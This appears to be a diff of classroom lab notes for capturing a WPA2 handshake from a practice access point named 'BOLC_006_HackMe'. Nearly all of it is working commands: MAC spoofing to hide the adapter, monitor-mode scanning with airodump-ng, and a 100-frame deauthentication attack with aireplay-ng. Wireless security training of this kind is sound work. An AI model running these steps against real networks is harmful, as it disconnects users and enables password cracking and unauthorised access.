@@ -3,7 +3,7 @@ Class: 25/006
 Note: Some commands require SUDO; Advisable to set up collection and command terminal windows
 
 Steps: 
-Confirm wlan int is up
+Confirm wlan int is up; make sure Alfa network is plugged in
 	iwconfig
 Change mac to hide Alfa - good best practice
 	sudo macchanger -r wlan1
@@ -13,12 +13,13 @@ Place int in monitor mode -> this is a critical step.
 Initial scan
 	airodump-ng wlan1mon
 	 0C:9D:92:49:C2:A8  -46       52       10    0   1  195   WPA2 CCMP   PSK  BOLC_006_HackMe 
-	    
+	Note: the critical information to review is alos the channel. Here it is 1. It can be different.    
 Channel Loc and BBSID lock
 	airodump-ng wlan1mon -c 1 --bssid 0C:9D:92:49:C2:A8 
+	Note: update channel if different channel is identified from prior step (initial scan)
 Posture to collect handshake
 	airodump-ng wlan1mon -c 1 --bssid 0C:9D:92:49:C2:A8 --write 006hackmehandshake
-	
+	Note: update channel if different channel is identified from prior step (initial scan)
 Conduct Deauth
 	aireplay-ng --deauth 100 -a 0C:9D:92:49:C2:A8 wlan1mon
 Confirm in airodump window that handshake is collected
